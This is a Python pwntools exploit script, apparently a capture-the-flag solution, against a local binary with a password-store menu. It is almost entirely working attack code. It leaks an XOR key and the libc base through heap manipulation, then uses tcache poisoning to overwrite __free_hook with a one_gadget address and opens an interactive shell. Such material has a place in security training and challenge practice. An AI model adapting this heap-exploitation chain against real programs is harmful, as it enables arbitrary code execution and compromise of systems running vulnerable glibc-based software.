from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b'Input Your Choice:'
def add(size, pwd, flag=True, ID=b'XiaozaYa'):
	sla(menu, b'1')
	sla(b'Save:', ID)
	sla(b'Pwd:', byte(size))
	if flag:
		sla(b'Pwd:', pwd)
	else:
		sda(b'Pwd:', pwd)

def edit(idx, content, flag=True):
	sla(menu, b'2')
	sleep(0.1)
	sl(byte(idx))
	sleep(0.1)	
	if flag:
		sl(content)
	else:
		sd(content)

def show(idx):
	sla(menu, b'3')
	sla(b'Check:', byte(idx))

def dele(idx):
	sla(menu, b'4')
	sla(b'Delete:', byte(idx))

add(0xf0, b'0') # 0
rut(b'ID:')
rc(8)
key = u64(rc(8))
info('key', key)


add(0x70, b'1') # 1
add(0xf0, b'2') # 2
add(0x10, b'3') # 3

for i in range(7):
	add(0xf0, b'A') 
for i in range(4, 7+4):
	dele(i) 

dele(0) 
dele(1)
pay = b'A'*0x70 + p64(key^0x180) + b'\x00'
add(0x78, pay, False) # 0
dele(2)

for i in range(7):
	add(0xf0, b'A') # 1 2 4 5 6 7 8

add(0xf0, b'9') # 9
show(0)
rut(b'Pwd is: ')
libc.address = (u64(rc(8))^key) - 0x3ebca0
info('libc_base', libc.address)

add(0x70, b'10') # 10

free_hook = libc.sym.__free_hook
ones = [0x4f2a5, 0x4f302, 0x10a2fc]
ones = [libc.address+i for i in ones]

add(0x70, b'11')
dele(11)
dele(0)
edit(10, p64(free_hook), False)

add(0x70, b'0')
add(0x70, p64(ones[1]^key))
dele(5)
#debug()
sh()
